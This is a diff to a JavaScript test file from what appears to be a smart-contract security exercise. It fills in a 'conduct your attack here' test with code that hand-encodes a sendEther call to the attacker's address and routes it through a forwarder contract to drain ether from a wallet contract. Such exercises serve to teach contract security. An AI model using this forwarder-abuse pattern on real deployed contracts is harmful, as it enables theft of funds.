@@ -36,7 +36,26 @@ describe(NAME, function () {
       );
     });
 
-    it("conduct your attack here", async function () {});
+    it("conduct your attack here", async function () {
+      const sendEtherFunctionSig =
+        "0x" +
+        ethers.utils.id("sendEther(address,uint256)").slice(0, 10).slice(2);
+      const destination = attackerWallet.address;
+      const amount = ethers.utils.parseEther("1");
+
+      const encodedDestination = ethers.utils.defaultAbiCoder
+        .encode(["address"], [destination])
+        .slice(2);
+      const encodedAmount = ethers.utils.defaultAbiCoder
+        .encode(["uint256"], [amount])
+        .slice(2);
+
+      const data = sendEtherFunctionSig + encodedDestination + encodedAmount;
+
+      await forwarderContract
+        .connect(attackerWallet)
+        .functionCall(walletContract.address, data);
+    });
 
     after(async function () {
       const attackerWalletBalanceAfter = await ethers.provider.getBalance(
